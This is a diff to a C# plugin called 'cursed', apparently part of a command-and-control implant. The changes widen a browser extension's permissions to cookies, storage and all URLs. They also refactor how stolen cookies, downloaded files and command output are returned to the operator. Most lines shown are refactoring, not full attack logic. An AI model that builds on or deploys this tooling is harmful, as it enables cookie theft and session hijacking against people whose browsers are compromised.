@@ -12,12 +12,14 @@ namespace Agent
         public string Name => "cursed";
         private IMessageManager messageManager { get; set; }
         private ISpawner spawner { get; set; }
-        private readonly List<string> main_permissions = new List<string> { "<all_urls>", "webRequest", "webRequestBlocking" };
+        private readonly List<string> main_permissions = new List<string> { "<all_urls>", "webRequest", "webRequestBlocking", "cookies", "storage", "declarativeNetRequest" };
+        private readonly List<string> main_v3_permissions = new List<string> { "webRequest", "cookies", "storage", "declarativeNetRequest" };
+        private readonly List<string> main_v3_host_permissions = new List<string> { "<all_urls>" };
         private readonly List<string> alt_permissions = new List<string> { "http://*/*", "https://*/*", "webRequest", "webRequestBlocking" };
         private Dictionary<string, string> cookiesOut = new Dictionary<string, string>();
         private CursedConfig config { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.config = new CursedConfig();
             this.messageManager = messageManager;
@@ -69,7 +71,7 @@ namespace Agent
                 },
             };
 
-            await this.messageManager.AddResponse(dr.ToJson());
+            this.messageManager.AddTaskResponse(dr.ToJson());
 
             this.cookiesOut.Remove(response.task_id);
         }
@@ -131,7 +133,7 @@ namespace Agent
                     break;
                 case "exit":
                     this.config = new CursedConfig();
-                    await this.messageManager.AddResponse(new InteractMessage()
+                    this.messageManager.AddInteractMessage(new InteractMessage()
                     {
                         task_id = message.task_id,
                         data = Misc.Base64Encode("Exited."),
@@ -139,7 +141,7 @@ namespace Agent
                     });
                     break;
                 case "help":
-                    await this.messageManager.AddResponse(new InteractMessage()
+                    this.messageManager.AddInteractMessage(new InteractMessage()
                     {
                         task_id = message.task_id,
                         data = Misc.Base64Encode(CommandParser.GetHelpText() + Environment.NewLine),
@@ -325,6 +327,10 @@ namespace Agent
             Type type = config.GetType();
             PropertyInfo property = type.GetProperty(choice);
 
+            if (property is null){
+                return;
+            }
+            
             switch (choice)
             {
                 case null:
@@ -415,7 +421,7 @@ namespace Agent
         } 
         private void StartSendFile(string task_id)
         {
-            messageManager.AddResponse(new DownloadTaskResponse
+            messageManager.AddTaskResponse(new DownloadTaskResponse
             {
                 download = new DownloadTaskResponseData()
                 {
@@ -430,7 +436,7 @@ namespace Agent
         }
         private void ReturnOutput(string message, string task_id)
         {
-            this.messageManager.AddResponse(new InteractMessage()
+            this.messageManager.AddInteractMessage(new InteractMessage()
             {
                 task_id = task_id,
                 data = Misc.Base64Encode(message + Environment.NewLine),
